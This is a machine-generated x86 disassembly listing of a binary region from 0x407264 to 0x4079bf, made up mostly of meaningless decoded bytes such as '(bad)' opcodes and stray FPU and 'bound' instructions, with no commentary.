  407264:	mov    DWORD PTR [ebx+eiz*4],ebp
  407267:	fnstcw WORD PTR [eax]
  407269:	es jb  0x407245
  40726c:	mov    DWORD PTR [ebx+eiz*4],ebp
  40726f:	fnstcw WORD PTR [ecx]
  407271:	es push edx
  407273:	(bad)  [ecx+0x1ad9a32c]
  407279:	es push edx
  40727b:	(bad)  [ecx+0x2c]
  40727e:	and    ebx,ecx
  407280:	sbb    esp,DWORD PTR [esi]
  407282:	jb     0x40725d
  407284:	dec    ecx
  407285:	sub    al,0x23
  407287:	frndint 
  407289:	and    eax,0x2c49d972
  40728e:	and    ebx,ecx
  407290:	std    
  407291:	and    eax,0x2c49d952
  407296:	and    ebx,ecx
  407298:	fisub  WORD PTR ds:0x2c89d952
  40729e:	and    ebx,ecx
  4072a0:	iret   
  4072a1:	and    eax,0x89d97200
  4072a6:	sub    al,0x23
  4072a8:	fld    st(0)
  4072aa:	and    eax,0x2c89d972
  4072af:	and    ebx,ecx
  4072b1:	mov    cl,0x25
  4072b3:	push   edx
  4072b4:	(bad)  [ecx-0x5d26dcd4]
  4072ba:	and    eax,0x2c49d952
  4072bf:	mov    ds:0x722593d9,eax
  4072c4:	(bad)  [ecx+0x2c]
  4072c7:	mov    ds:0x722584d9,eax
  4072cc:	(bad)  [ecx+0x2c]
  4072cf:	mov    ds:0x7f7700d9,eax
  4072d4:	leave  
  4072d5:	add    BYTE PTR [ebx+0x7e],cl
  4072d8:	sbb    al,BYTE PTR [ecx]
  4072da:	data16 jl 0x4072a6
  4072dd:	add    BYTE PTR [ebx+0x69011a49],cl
  4072e3:	outs   dx,DWORD PTR ds:[esi]
  4072e4:	(bad)  
  4072e6:	dec    edi
  4072e7:	sbb    al,BYTE PTR ds:[ecx]
  4072ea:	push   0x4004d920
  4072ef:	dec    esi
  4072f0:	sbb    al,BYTE PTR [ecx]
  4072f2:	imul   edi,DWORD PTR [ecx+ebx*8],0x0
  4072f6:	xor    BYTE PTR [esi],bh
  4072f8:	sbb    al,BYTE PTR [ecx]
  4072fa:	push   0x4f
  4072fc:	(bad)  
  4072fe:	pop    ds
  4072ff:	mov    ds,WORD PTR [edx]
  407301:	add    DWORD PTR [ebp+0x7c],ebp
  407304:	fiadd  DWORD PTR [eax]
  407306:	adc    BYTE PTR [eax],al
  407308:	jle    0x407324
  40730a:	add    DWORD PTR [esp+edi*2-0x26],ebp
  40730e:	add    BYTE PTR [eax],al
  407310:	mov    ds,WORD PTR [edx]
  407312:	add    DWORD PTR [edi+0x7c],ebp
  407315:	fiadd  DWORD PTR [eax]
  407317:	lock jns 0x407334
  40731a:	add    DWORD PTR [esi+0x7c],ebp
  40731d:	fiadd  DWORD PTR [eax]
  40731f:	loopne 0x40736a
  407321:	sbb    al,BYTE PTR [ecx]
  407323:	popa   
  407324:	cmp    al,0xda
  407326:	add    al,dl
  407328:	cmp    DWORD PTR [edx],ebx
  40732a:	add    DWORD PTR [eax+0x3c],esi
  40732d:	fiadd  DWORD PTR [eax]
  40732f:	ror    BYTE PTR [ecx+0x1a],0x1
  407333:	arpl   WORD PTR [edx+ebx*8],di
  407336:	add    BYTE PTR [eax+0x72011a39],dh
  40733c:	cmp    al,0xda
  40733e:	add    BYTE PTR [eax+0x65011889],ah
  407344:	jl     0x40731e
  407346:	add    BYTE PTR [eax+0x11879],dl
  40734c:	into   
  40734d:	mov    bh,0xff
  40734f:	jmp    edx
  407351:	ret    0x3f
  407354:	mov    ebp,0xb2ffffb7
  407359:	ret    0x3f
  40735c:	lods   al,BYTE PTR ds:[esi]
  40735d:	mov    ah,0xff
  40735f:	inc    DWORD PTR [edx-0x64ffc043]
  407365:	imul   edi,esi,0xffffffff
  407368:	mov    dl,0xbd
  40736a:	aas    
  40736b:	add    BYTE PTR [eax],al
  40736d:	stos   BYTE PTR es:[edi],al
  40736e:	imul   edi,esi,0xffffffff
  407371:	mov    ds:0x99003fbd,al
  407376:	imul   edi,esi,0xffffffff
  407379:	xor    bh,BYTE PTR [ebp+0x6b68003f]
  40737f:	(bad)  
  407380:	inc    DWORD PTR [edx+0x57003fbd]
  407386:	imul   edi,esi,0xffffffff
  407389:	jb     0x407348
  40738b:	aas    
  40738c:	add    BYTE PTR [esi],ah
  40738e:	imul   edi,esi,0xffffffff
  407391:	bound  edi,QWORD PTR [ebp+0x6b15003f]
  407397:	(bad)  
  407398:	push   DWORD PTR [edx+0x24003fc2]
  40739e:	imul   edi,esi,0xffffffff
  4073a1:	add    dl,0x3f
  4073a4:	add    BYTE PTR [ebx],dl
  4073a6:	imul   edi,esi,0xffffffff
  4073a9:	mov    dl,0xc2
  4073ab:	aas    
  4073ac:	add    BYTE PTR [edx],al
  4073ae:	imul   edi,esi,0xffffffff
  4073b1:	mov    ds:0x11003fc2,al
  4073b6:	sub    esi,edi
  4073b8:	(bad)  
  4073ba:	ret    0x3f
  4073bd:	loopne 0x40742a
  4073bf:	(bad)  
  4073c0:	inc    DWORD PTR [edx]
  4073c2:	ret    0x3f
  4073c5:	(bad)  
  4073c6:	in     al,0xf2
  4073c8:	dec    DWORD PTR [ebp+0x49]
  4073cb:	sub    al,BYTE PTR [ecx+0x62]
  4073ce:	cmc    
  4073cf:	repnz inc DWORD PTR [eax]
  4073d2:	cmp    eax,0x62412a59
  4073d7:	push   es
  4073d8:	repz jmp FWORD PTR ds:0x624129e9
  4073df:	push   edi
  4073e0:	hlt    
  4073e1:	call   FWORD PTR ds:0x62412cf9
  4073e7:	pusha  
  4073e8:	adc    BYTE PTR [eax],al
  4073ea:	inc    edx
  4073eb:	or     DWORD PTR ds:0x10616241,ebp
  4073f1:	add    BYTE PTR [edx+0x19],al
  4073f4:	sub    eax,0x10626241
  4073f9:	add    BYTE PTR [edx-0x57],al
  4073fc:	sub    al,0x41
  4073fe:	bound  esp,QWORD PTR [ebx]
  407400:	adc    BYTE PTR [eax],al
  407402:	cmp    BYTE PTR [ecx+0x1c62412c],0xf4
  407409:	dec    ebp
  40740b:	enter  0x412c,0x62
  40740f:	sbb    eax,0xd8bdfff4
  407414:	sub    al,0x41
  407416:	bound  ebx,QWORD PTR [esi]
  407418:	hlt    
  407419:	jmp    FWORD PTR [ebp+0x62412a68]
  40741f:	pop    edi
  407420:	hlt    
  407421:	call   FWORD PTR [ebp+0x62412a78]
  407427:	pop    eax
  407428:	and    eax,DWORD PTR [eax]
  40742a:	bound  ecx,QWORD PTR [ecx+0x4962412a]
  407430:	adc    BYTE PTR [eax],al
  407432:	bound  ebx,QWORD PTR [ecx+0x6200412a]
  407438:	pop    edx
  407439:	hlt    
  40743a:	jmp    FWORD PTR [ebp+0x28]
  40743d:	sub    al,BYTE PTR [ecx+0x62]
  407440:	fst    DWORD PTR [edx-0xb]
  407443:	pop    ebp
  407444:	ins    DWORD PTR es:[edi],dx
  407445:	mov    eax,ds:0x43d9a32b
  40744a:	cmc    
  40744b:	dec    ebp
  40744c:	ins    DWORD PTR es:[edi],dx
  40744d:	xchg   ecx,eax
  40744e:	sub    esp,DWORD PTR [ebx+0x3df554d9]
  407454:	ins    DWORD PTR es:[edi],dx
  407455:	sub    DWORD PTR [ebx],0xf545d9a3
  40745b:	sub    eax,0xa32b716d
  407460:	fst    DWORD PTR [esi+0x616d1df4]
  407466:	sub    al,0xa3
  407468:	fst    DWORD PTR [edi+0x50d96221]
  40746e:	sub    al,0xa3
  407470:	fnstcw WORD PTR [eax+0x21]
  407473:	(bad)  
  407474:	fld    DWORD PTR [eax+0x2c]
  407477:	mov    ds:0x622179d9,eax
  40747c:	fnstenv [eax]
  40747e:	sub    al,0xa3
  407480:	fstp   DWORD PTR [edx+0x21]
  407483:	(bad)  
  407484:	fldenv [eax]
  407486:	sub    al,0x23
  407488:	fstp   DWORD PTR [ebx+0x21]
  40748b:	(bad)  
  40748c:	fst    DWORD PTR [eax]
  40748e:	sub    al,0x23
  407490:	fnstcw WORD PTR [ecx+eiz*1]
  407493:	(bad)  
  407494:	fld    DWORD PTR [eax]
  407496:	sub    al,0x23
  407498:	fnstcw WORD PTR ds:0xd9620021
  40749e:	lock sub esp,DWORD PTR [ebx]
  4074a1:	fstp   DWORD PTR [esi-0x1f269ddf]
  4074a7:	sub    esp,DWORD PTR [ebx]
  4074a9:	(bad)  [edi-0x2ea69df0]
  4074af:	sub    esp,DWORD PTR [ebx]
  4074b1:	fld    DWORD PTR [eax-0x3f269df0]
  4074b7:	sub    esp,DWORD PTR [ebx]
  4074b9:	fld    DWORD PTR [eax]
  4074bb:	jae    0x40750f
  4074bd:	fld    DWORD PTR [eax]
  4074bf:	mov    al,0x39
  4074c1:	sbb    al,BYTE PTR [ecx]
  4074c3:	bound  esi,QWORD PTR [edx-0x27]
  4074c6:	add    BYTE PTR [eax+0x55011a89],ah
  4074cc:	jb     0x4074a7
  4074ce:	add    BYTE PTR [eax+0x44011a79],dl
  4074d4:	push   edx
  4074d5:	fld    DWORD PTR [eax]
  4074d7:	or     BYTE PTR [ecx+0x5237011a],0xd9
  4074de:	add    BYTE PTR [eax+0x79],dh
  4074e1:	sbb    al,BYTE PTR [ecx]
  4074e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074e4:	ins    DWORD PTR es:[edi],dx
  4074e5:	fld    DWORD PTR [eax]
  4074e7:	pusha  
  4074e8:	inc    esi
  4074e9:	sbb    al,BYTE PTR [ecx]
  4074eb:	test   eax,0x4fffda73
  4074f0:	sbb    al,BYTE PTR ss:[ecx]
  4074f3:	test   al,0x53
  4074f5:	(bad)  
  4074f7:	aas    
  4074f8:	inc    esi
  4074f9:	sbb    al,BYTE PTR [ecx]
  4074fb:	stos   DWORD PTR es:[edi],eax
  4074fc:	push   ebx
  4074fd:	fld    DWORD PTR [eax]
  4074ff:	xor    BYTE PTR [eax],al
  407501:	sbb    al,BYTE PTR ss:[ecx]
  407504:	stos   BYTE PTR es:[edi],al
  407505:	shr    DWORD PTR [ebx-0x2],1
  407508:	and    BYTE PTR [esi-0x7f52fee6],al
  40750e:	fiadd  DWORD PTR [eax]
  407510:	adc    BYTE PTR [esi+0x1a],dh
  407513:	add    DWORD PTR [eax+eax*4-0x79ffff26],ebp
  40751a:	sbb    al,BYTE PTR [ecx]
  40751c:	scas   eax,DWORD PTR es:[edi]
  40751d:	push   ebx
  40751e:	(bad)  
  407520:	out    dx,eax
  407521:	jns    0x40753d
  407523:	add    DWORD PTR [esi],ebp
  407525:	(bad)  
  407527:	add    al,0xe0
  407529:	dec    ecx
  40752a:	sbb    al,BYTE PTR [ecx]
  40752c:	and    DWORD PTR [edx+0x39d0fe6b],esp
  407532:	sbb    al,BYTE PTR [ecx]
  407534:	add    BYTE PTR [edx],dh
  407536:	push   0xbfa2fffe
  40753b:	aas    
  40753c:	add    BYTE PTR [ecx-0x36],al
  40753f:	add    BYTE PTR [eax],dl
  407541:	mov    dl,0xbf
  407543:	aas    
  407544:	add    BYTE PTR [eax+0x20ffe66],dl
  40754a:	mov    edi,0x6687003f
  40754f:	dec    BYTE PTR [edi]
  407551:	repnz mov esi,0xb776003f
  407557:	add    BYTE PTR [eax],dl
  407559:	loop   0x407519
  40755b:	aas    
  40755c:	add    BYTE PTR [ebp-0x4df0019a],al
  407562:	mov    esi,0xd400003f
  407567:	dec    BYTE PTR [bx]
  40756a:	cmp    BYTE PTR [ebp-0x4734ffc1],0xff
  407571:	push   DWORD PTR [edx-0x25ffc043]
  407577:	mov    eax,0xbda2ffff
  40757c:	aas    
  40757d:	add    cl,cl
  40757f:	mov    eax,0xbd32ffff
  407584:	aas    
  407585:	add    BYTE PTR [eax],bl
  407587:	mov    ecx,0xbd82ffff
  40758c:	aas    
  40758d:	add    BYTE PTR [edi],cl
  40758f:	mov    ecx,0xbd720000
  407594:	aas    
  407595:	add    dh,bl
  407597:	mov    eax,0xbd620000
  40759c:	aas    
  40759d:	add    ch,cl
  40759f:	addr16 (bad) 
  4075a1:	jmp    FWORD PTR [ebx-0x40]
  4075a4:	aas    
  4075a5:	add    BYTE PTR [edi+eiz*2-0x2],bl
  4075a9:	inc    DWORD PTR [edx+0x62003fbe]
  4075af:	test   al,0x1f
  4075b1:	add    DWORD PTR [edx-0x77],esp
  4075b4:	sub    al,BYTE PTR [ecx+0x62]
  4075b7:	mov    ecx,0x9962011f
  4075bc:	sub    al,BYTE PTR [ecx+0x62]
  4075bf:	(bad)  
  4075c0:	pop    ds
  4075c1:	add    DWORD PTR [edx+0x29],esp
  4075c4:	sub    al,BYTE PTR [ecx+0x62]
  4075c7:	pop    ss
  4075c8:	and    BYTE PTR [ecx],al
  4075ca:	add    BYTE PTR [edx+0x39],ah
  4075cd:	sub    al,BYTE PTR [ecx+0x62]
  4075d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075d1:	pop    ds
  4075d2:	add    DWORD PTR [edx+0x49],esp
  4075d5:	sub    al,BYTE PTR [ecx+0x62]
  4075d8:	mov    ch,0x1f
  4075da:	add    DWORD PTR [edx+0x59],esp
  4075dd:	sub    al,BYTE PTR [ecx+0x62]
  4075e0:	ret    0x11f
  4075e3:	(bad)  
  4075e4:	jmp    0x93a2b712
  4075e9:	out    0x0,eax
  4075eb:	(bad)  
  4075ec:	stc    
  4075ed:	pop    esp
  4075ee:	inc    ecx
  4075ef:	bound  esp,QWORD PTR [eax+0x9a20fe7]
  4075f5:	pop    ebp
  4075f6:	inc    ecx
  4075f7:	bound  esp,QWORD PTR [ecx+0x19a20fe7]
  4075fd:	pop    ebp
  4075fe:	inc    ecx
  4075ff:	bound  ebx,QWORD PTR [esi-0x565df019]
  407605:	pop    esp
  407606:	inc    ecx
  407607:	bound  ebx,QWORD PTR [edi-0x19]
  40760a:	punpckldq mm3,DWORD PTR [esi]
  40760d:	pop    esp
  40760e:	inc    ecx
  40760f:	bound  ebx,QWORD PTR [edi+eiz*8-0x1]
  407613:	vsubps xmm0,xmm6,XMMWORD PTR [ecx+0x62]
  407618:	pop    ebp
  407619:	out    0xff,eax
  40761b:	mov    ch,0xd8
  40761d:	pop    esp
  40761e:	inc    ecx
  40761f:	bound  ebx,QWORD PTR [edx-0x19]
  407622:	jmp    DWORD PTR [ebp+0x62415a68]
  407628:	(bad)  [esi-0x1a]
  40762b:	xchg   ebp,eax
  40762c:	imul   esp,ecx,0xd923005b
  407632:	aas    
  407633:	stc    
  407634:	push   ebp
  407635:	fnop   
  407637:	pop    ebx
  407638:	and    ebx,ecx
  40763a:	push   eax
  40763b:	stc    
  40763c:	gs fld st(0)
  40763f:	pop    ebx
  407640:	and    ebx,ecx
  407642:	inc    ecx
  407643:	(bad)  [ebp-0x27]
  407646:	mov    al,0x5b
  407648:	mov    ds:0x65e612d9,eax
  40764d:	(bad)  [ecx+0x5d]
  407650:	mov    ds:0x621503d9,eax
  407655:	fst    DWORD PTR [eax+0x14d9a35b]
  40765b:	adc    eax,0x5b80d962
  407660:	mov    ds:0x621505d9,eax
  407665:	fnstenv [eax+0x5b]
  407668:	mov    ds:0x6214d6d9,eax
  40766d:	fldenv [eax+0x5c]
  407670:	mov    ds:0x6214d7d9,eax
  407675:	fnstcw WORD PTR [ebx]
  407677:	pop    ebp
  407678:	mov    ds:0x6214b8d9,eax
  40767d:	fnstenv [edi+0x5d]
  407680:	mov    ds:0x6214b9d9,eax
  407685:	fnstcw WORD PTR [ebx]
  407687:	pop    ebp
  407688:	and    ebx,ecx
  40768a:	call   0x235d:0xbd96214
  407691:	fstp   DWORD PTR [ebx-0x269dffec]
  407697:	adc    BYTE PTR [ebx+eiz*1-0x27],bl
  40769b:	jl     0x4076b1
  40769d:	(bad)  
  40769e:	fld    DWORD PTR [eax]
  4076a0:	pop    esp
  4076a1:	and    ebx,ecx
  4076a3:	add    BYTE PTR [edi+0x61],bh
  4076a6:	fld    DWORD PTR [eax]
  4076a8:	in     al,0x3c
  4076aa:	sbb    al,BYTE PTR [ecx]
  4076ac:	pop    esi
  4076ad:	popa   
  4076ae:	fld    DWORD PTR [eax]
  4076b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076b1:	sub    al,0x1a
  4076b3:	add    DWORD PTR [ecx+0x6e],edx
  4076b6:	fld    DWORD PTR [eax]
  4076b8:	rcr    BYTE PTR [ecx],1
  4076ba:	sbb    al,BYTE PTR [ecx]
  4076bc:	inc    eax
  4076bd:	dec    esi
  4076be:	fld    DWORD PTR [eax]
  4076c0:	ror    BYTE PTR [ecx],0x1a
  4076c3:	add    DWORD PTR [ebx],esi
  4076c5:	dec    esi
  4076c6:	fld    DWORD PTR [eax]
  4076c8:	mov    al,0xb9
  4076ca:	sbb    al,BYTE PTR [ecx]
  4076cc:	and    ch,BYTE PTR [esi-0x27]
  4076cf:	add    BYTE PTR [eax+0x15011aa9],ah
  4076d5:	outs   dx,BYTE PTR ds:[esi]
  4076d6:	fld    DWORD PTR [eax]
  4076d8:	nop
  4076d9:	cdq    
  4076da:	sbb    al,BYTE PTR [ecx]
  4076dc:	add    al,0x4e
  4076de:	fld    DWORD PTR [eax]
  4076e0:	or     BYTE PTR [ecx+0x3ef7011a],0xd9
  4076e7:	add    BYTE PTR [eax-0x47],dh
  4076ea:	sbb    al,BYTE PTR [ecx]
  4076ec:	out    0x5e,al
  4076ee:	fld    DWORD PTR [eax]
  4076f0:	scas   ax,WORD PTR es:[edi]
  4076f2:	sbb    al,BYTE PTR [ecx]
  4076f4:	jmp    0xe941505a
  4076f9:	add    BYTE PTR [ecx-0x27],ah
  4076fc:	add    cl,dh
  4076fe:	mov    ds:0x61f100d9,al
  407703:	fld    DWORD PTR [eax]
  407705:	loopne 0x4076a9
  407707:	fld    DWORD PTR [eax]
  407709:	loopne 0x40776c
  40770b:	fld    DWORD PTR [eax]
  40770d:	repnz and bl,cl
  407710:	add    ch,ch
  407712:	popa   
  407713:	fld    DWORD PTR [eax]
  407715:	in     al,0x22
  407717:	fld    DWORD PTR [eax]
  407719:	fsub   QWORD PTR [ecx-0x27]
  40771c:	add    BYTE PTR [eax],al
  40771e:	cwde   
  40771f:	sbb    BYTE PTR [ecx],al
  407721:	add    BYTE PTR [eax-0x6fffff25],cl
  407727:	sbb    BYTE PTR [ecx],al
  407729:	add    BYTE PTR [eax-0x3ffff25],dh
  40772f:	sbb    DWORD PTR [ecx],eax
  407731:	add    BYTE PTR [ebp-0x24],bl
  407734:	add    BYTE PTR [eax],al
  407736:	retf   
  407737:	sbb    BYTE PTR [ecx],al
  407739:	add    BYTE PTR [edi-0x24],ah
  40773c:	add    BYTE PTR [eax],al
  40773e:	ficomp DWORD PTR [eax]
  407740:	add    DWORD PTR [eax],eax
  407742:	data16 fadd QWORD PTR [eax]
  407745:	add    cl,cl
  407747:	sbb    BYTE PTR [ecx],al
  407749:	add    BYTE PTR [ebp-0x26],ah
  40774c:	add    BYTE PTR [eax],al
  40774e:	sbb    BYTE PTR [edx],bl
  407750:	add    DWORD PTR [eax],eax
  407752:	and    al,0xdc
  407754:	add    BYTE PTR [eax],al
  407756:	pop    es
  407757:	sbb    al,BYTE PTR [ecx]
  407759:	add    BYTE PTR [ebx],ah
  40775b:	fadd   QWORD PTR [eax]
  40775d:	add    BYTE PTR [eax],al
  40775f:	(bad)  
  407760:	sbb    DWORD PTR [ecx],eax
  407762:	add    BYTE PTR [edx],bl
  407764:	fadd   QWORD PTR [eax]
  407766:	add    ch,al
  407768:	sbb    DWORD PTR [ecx],eax
  40776a:	add    BYTE PTR [ecx],ch
  40776c:	fadd   QWORD PTR [eax]
  40776e:	add    BYTE PTR [eax+ebx*1+0x1],dl
  407772:	add    BYTE PTR [eax-0x26],bl
  407775:	add    BYTE PTR [eax],al
  407777:	fwait
  407778:	sbb    BYTE PTR [ecx],al
  40777a:	add    BYTE PTR [edx-0x23],ah
  40777d:	add    BYTE PTR [eax],al
  40777f:	stos   BYTE PTR es:[edi],al
  407780:	sbb    BYTE PTR [ecx],al
  407782:	add    BYTE PTR [edi-0x23],bl
  407785:	add    BYTE PTR [eax],al
  407787:	cdq    
  407788:	sbb    BYTE PTR [ecx],al
  40778a:	add    BYTE PTR [eax-0x23],ah
  40778d:	add    BYTE PTR [eax],al
  40778f:	push   0x9e000118
  407794:	fild   DWORD PTR [eax]
  407796:	add    BYTE PTR [edx-0x26],ah
  407799:	aas    
  40779a:	add    BYTE PTR [edx+0x27],ah
  40779d:	add    al,BYTE PTR [eax]
  40779f:	(bad)  
  4077a0:	retf   
  4077a1:	aas    
  4077a2:	add    BYTE PTR [edx+0x73],ah
  4077a5:	add    eax,DWORD PTR [eax]
  4077a7:	(bad)  
  4077a8:	lock inc eax
  4077aa:	add    BYTE PTR [edx-0x70],ah
  4077ad:	add    al,BYTE PTR [eax]
  4077af:	(bad)  
  4077b0:	jmp    0x69a277f5
  4077b5:	add    al,BYTE PTR [eax]
  4077b7:	(bad)  
  4077b8:	std    
  4077b9:	inc    eax
  4077ba:	add    BYTE PTR [edx-0x7b],ah
  4077bd:	add    eax,DWORD PTR [eax]
  4077bf:	bound  eax,QWORD PTR [ecx]
  4077c1:	inc    ecx
  4077c2:	add    BYTE PTR [eax],al
  4077c4:	bound  esp,QWORD PTR [eax]
  4077c6:	add    al,BYTE PTR [eax]
  4077c8:	bound  eax,QWORD PTR [edx]
  4077ca:	inc    ecx
  4077cb:	add    BYTE PTR [edx+0x21],ah
  4077ce:	add    al,BYTE PTR [eax]
  4077d0:	(bad)  
  4077d2:	inc    eax
  4077d3:	add    BYTE PTR [edx+0x42],ah
  4077d6:	add    al,BYTE PTR [eax]
  4077d8:	(bad)  
  4077d9:	in     al,0x40
  4077db:	add    BYTE PTR [edx+0x43],ah
  4077de:	add    al,BYTE PTR [eax]
  4077e0:	bound  eax,QWORD PTR ds:0x9c620041
  4077e6:	add    al,BYTE PTR [eax]
  4077e8:	bound  eax,QWORD PTR [esi]
  4077ea:	inc    ecx
  4077eb:	add    BYTE PTR [edx-0x63],ah
  4077ee:	add    al,BYTE PTR [eax]
  4077f0:	(bad)  
  4077f1:	out    0x3d,eax
  4077f3:	add    BYTE PTR [edx-0x22],ah
  4077f6:	add    al,0x0
  4077f8:	(bad)  
  4077f9:	call   0xdfa2783b
  4077fe:	add    al,0x0
  407800:	(bad)  
  407801:	stc    
  407802:	cmp    eax,0x4c86200
  407807:	add    BYTE PTR [edx+0xc],ah
  40780a:	add    BYTE PTR ds:[edx-0x2d],ah
  40780e:	add    al,0x0
  407810:	(bad)  
  407811:	fld    DWORD PTR [ecx-0x37269dc1]
  407817:	add    esp,DWORD PTR [edx-0x27]
  40781a:	jb     0x40785b
  40781c:	(bad)  
  40781d:	fxch   st(1)
  40781f:	add    esp,DWORD PTR [edx-0x27]
  407822:	fs aas 
  407824:	(bad)  
  407825:	fldpi  
  407827:	add    eax,DWORD PTR [eax]
  407829:	(bad)  
  40782a:	fst    DWORD PTR [ebp+0x3f]
  40782d:	(bad)  
  40782e:	fnstcw WORD PTR [ebx+eax*1+0x3f86d962]
  407835:	(bad)  
  407836:	(bad)  ds:0x81d96204
  40783c:	aas    
  40783d:	(bad)  
  40783e:	fld    st(1)
  407840:	add    esp,DWORD PTR [edx-0x27]
  407843:	xchg   edx,eax
  407844:	aas    
  407845:	(bad)  
  407846:	(bad)  
  407848:	add    esp,DWORD PTR [edx-0x27]
  40784b:	cmp    DWORD PTR [edi],0x62
  40784e:	fnstcw WORD PTR [ebx+0x54d96203]
  407854:	aas    
  407855:	(bad)  
  407856:	(bad)  [ebx+eax*1+0x3f45d962]
  40785d:	(bad)  
  40785e:	fnstcw WORD PTR [ebp+0x3]
  407861:	(bad)  
  407862:	fst    DWORD PTR [esi+0x3f]
  407865:	(bad)  
  407866:	(bad)  [esi+0x37d96204]
  40786c:	aas    
  40786d:	(bad)  
  40786e:	fld    DWORD PTR [edi-0x67269dfd]
  407874:	ds (bad) 
  407876:	(bad)  [eax+0x4]
  407879:	(bad)  
  40787a:	fstp   DWORD PTR [ecx+0x49d9623e]
  407880:	add    al,0x62
  407882:	fnstcw WORD PTR [edx+0x3e]
  407885:	(bad)  
  407886:	(bad)  [edx+0x4]
  407889:	(bad)  
  40788a:	fld    DWORD PTR [eax]
  40788c:	jge    0x40788e
  40788e:	pushf  
  40788f:	fld    DWORD PTR [eax]
  407891:	inc    ebp
  407892:	pop    esi
  407893:	fld    DWORD PTR [eax]
  407895:	pop    esp
  407896:	mov    ecx,ds
  407898:	add    BYTE PTR [esi+ebx*2],al
  40789b:	fld    DWORD PTR [eax]
  40789d:	pop    edi
  40789e:	jl     0x407879
  4078a0:	add    BYTE PTR [edi],al
  4078a2:	pop    esi
  4078a3:	fld    DWORD PTR [eax]
  4078a5:	ds ins BYTE PTR es:[edi],dx
  4078a7:	fld    DWORD PTR [eax]
  4078a9:	push   es
  4078aa:	pop    esi
  4078ab:	fld    DWORD PTR [eax]
  4078ad:	xor    DWORD PTR [ecx+ebx*8+0x0],ebx
  4078b1:	add    DWORD PTR [esi-0x27],ebx
  4078b4:	add    BYTE PTR [eax-0x2fff26b4],ah
  4078ba:	popa   
  4078bb:	fld    DWORD PTR [eax]
  4078bd:	xchg   edi,eax
  4078be:	cmp    al,0xd9
  4078c0:	add    cl,bl
  4078c2:	popa   
  4078c3:	fld    DWORD PTR [eax]
  4078c5:	xchg   BYTE PTR [ecx+ebx*8],ch
  4078c8:	add    BYTE PTR [eax+0x2900d961],bh
  4078ce:	pushf  
  4078cf:	fld    DWORD PTR [eax]
  4078d1:	mov    ebx,0x2800d961
  4078d6:	mov    ecx,ds
  4078d8:	add    BYTE PTR [edx+0x2b00d961],bl
  4078de:	jl     0x4078b9
  4078e0:	add    BYTE PTR [ebp+0x2a00d961],dl
  4078e6:	ins    BYTE PTR es:[edi],dx
  4078e7:	fld    DWORD PTR [eax]
  4078e9:	je     0x40794c
  4078eb:	fld    DWORD PTR [eax]
  4078ed:	sub    eax,0x7700d95c
  4078f2:	add    BYTE PTR [ecx-0x27],ah
  4078f5:	add    BYTE PTR [edi+ecx*2+0x5e5600d9],ch
  4078fc:	fld    DWORD PTR [eax]
  4078fe:	scas   eax,DWORD PTR es:[edi]
  4078ff:	aas    
  407900:	fld    DWORD PTR [eax]
  407902:	push   ecx
  407903:	pop    esi
  407904:	fld    DWORD PTR [eax]
  407906:	add    BYTE PTR [ebp+eiz*4-0x225e0000],bh
  40790d:	add    BYTE PTR [eax],al
  40790f:	add    esp,DWORD PTR [esi-0x226f0000]
  407915:	add    BYTE PTR [eax],al
  407917:	adc    ah,BYTE PTR [esi-0x22800000]
  40791d:	add    BYTE PTR [eax],al
  40791f:	add    DWORD PTR [esi-0x22990000],esp
  407925:	add    BYTE PTR [eax],al
  407927:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407929:	add    BYTE PTR [eax],al
  40792b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40792c:	xlat   BYTE PTR ds:[ebx]
  40792d:	add    BYTE PTR [eax],al
  40792f:	(bad)  
  407930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407931:	add    BYTE PTR [eax],al
  407933:	test   edi,edx
  407935:	add    BYTE PTR [eax],al
  407937:	push   esi
  407938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407939:	add    BYTE PTR [eax],al
  40793b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40793c:	xlat   BYTE PTR ds:[ebx]
  40793d:	add    BYTE PTR [eax],al
  40793f:	inc    ebp
  407940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407941:	add    BYTE PTR [eax],al
  407943:	or     ebx,ebp
  407945:	add    BYTE PTR [eax],al
  407947:	xor    al,0xa6
  407949:	add    BYTE PTR [eax],al
  40794b:	cli    
  40794c:	fadd   QWORD PTR [eax]
  40794e:	add    BYTE PTR [ebx-0x5c],bh
  407951:	add    BYTE PTR [eax],al
  407953:	leave  
  407954:	fld    QWORD PTR [eax]
  407956:	add    BYTE PTR [eax],al
  407958:	mov    ah,BYTE PTR [eax+eax*1+0xddb800]
  40795f:	add    BYTE PTR [ecx-0x5c],bh
  407962:	add    BYTE PTR [eax],al
  407964:	mov    edi,0x480000dd
  407969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40796a:	add    BYTE PTR [eax],al
  40796c:	mov    esi,0x7f0000dd
  407971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407972:	add    BYTE PTR [eax],al
  407974:	jge    0x407953
  407976:	add    BYTE PTR [eax],al
  407978:	into   
  407979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40797a:	add    BYTE PTR [eax],al
  40797c:	jl     0x407954
  40797e:	add    BYTE PTR [eax],al
  407980:	bound  edx,QWORD PTR [ecx+0x5062003d]
  407986:	add    al,BYTE PTR [eax]
  407988:	bound  ecx,QWORD PTR [esi+0x5162003d]
  40798e:	add    al,BYTE PTR [eax]
  407990:	bound  ecx,QWORD PTR [edi+0x4e62003d]
  407996:	add    al,BYTE PTR [eax]
  407998:	bound  edx,QWORD PTR [ebp+edi*1+0x0]
  40799c:	bound  ecx,QWORD PTR [edi]
  40799e:	add    eax,DWORD PTR [eax]
  4079a0:	bound  ebx,QWORD PTR [ecx+0x3d]
  4079a3:	add    BYTE PTR [edx+0x1c],ah
  4079a6:	add    al,BYTE PTR [eax]
  4079a8:	bound  eax,QWORD PTR [esi+0x3d]
  4079ab:	add    BYTE PTR [edx+0x1d],ah
  4079ae:	add    eax,DWORD PTR [eax]
  4079b0:	bound  edx,QWORD PTR [edi+0x3d]
  4079b3:	add    BYTE PTR [edx-0x39],ah
  4079b6:	add    al,0x0
  4079b8:	bound  ecx,QWORD PTR [edi*1+0x24620000]
  4079bf:	add    al,BYTE PTR [eax]
